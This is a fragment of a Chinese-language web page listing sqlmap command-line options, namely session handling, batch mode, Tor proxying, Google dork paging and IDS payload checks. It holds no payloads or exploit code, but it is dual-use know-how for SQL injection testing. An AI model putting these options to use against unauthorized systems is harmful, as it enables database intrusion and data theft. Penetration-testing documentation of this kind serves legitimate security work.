		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--flush-session 刷新当前目标的会话文件
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--fresh-queries 忽略在会话文件中存储的查询结果
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--eta 显示每个输出的预计到达时间
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--update 更新SqlMap
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--save file保存选项到INI配置文件
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--batch 从不询问用户输入，使用所有默认配置。
	</li>
</ul>
<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
	Miscellaneous（杂项）：
</h3>
<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--beep 发现SQL注入时提醒
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--check-payload IDS对注入payloads的检测测试
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--cleanup SqlMap具体的UDF和表清理DBMS
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--forms 对目标URL的解析和测试形式
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--page-rank Google dork结果显示网页排名（PR）
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--parse-errors 从响应页面解析数据库管理系统的错误消息
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--replicate 复制转储的数据到一个sqlite3数据库
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
	</li>
	<li style="list-style:square;margin-left:15px;color:#666666;">
		--wizard 给初级用户的简单向导界面
	</li>
</ul>